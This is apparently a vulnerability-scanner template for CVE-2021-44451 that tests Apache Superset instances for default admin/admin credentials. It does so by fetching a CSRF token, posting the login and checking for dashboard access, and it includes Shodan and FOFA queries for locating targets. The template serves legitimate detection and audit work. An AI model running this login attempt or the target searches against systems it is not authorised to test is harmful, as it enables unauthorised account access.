http:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: csrf_token
    part: body
    regex:
    - name="csrf_token" type="hidden" value="(.*)"
    type: regex
  matchers:
  - part: header_2
    type: word
    words:
    - session
  - part: body_3
    type: word
    words:
    - DashboardFilterStateRestApi
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'GET /login/ HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /login/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    csrf_token={{csrf_token}}&username={{username}}&password={{password}}

    '
  - 'GET /dashboard/list/ HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-44451
info:
  author: dhiyaneshDK
  classification:
    cpe: cpe:2.3:a:apache:superset:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-44451
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cwe-id: CWE-522
    epss-percentile: 0.98653
    epss-score: 0.71271
  description: 'Apache Superset through 1.3.2 contains a default login vulnerability
    via registered database connections for authenticated users. An attacker can obtain
    access to user accounts and thereby obtain sensitive information, modify data,
    and/or execute unauthorized operations.

    '
  impact: 'An attacker can gain unauthorized access to the Apache Superset application.

    '
  metadata:
    fofa-query:
    - body="apache superset"
    - icon_hash=1582430156
    max-request: 3
    product: superset
    shodan-query:
    - http.favicon.hash:1582430156
    - http.html:"apache superset"
    vendor: apache
    verified: true
  name: Apache Superset <=1.3.2 - Default Login
  reference:
  - https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/apache-superset-default-credentials.json
  - https://lists.apache.org/thread/xww1pccs2ckb5506wrf1v4lmxg198vkb
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44451
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/ARPSyndicate/cvemon
  remediation: Upgrade to Apache Superset 1.4.0 or higher.
  severity: medium
  tags: cve2021,cve,apache,superset,default-login,vuln
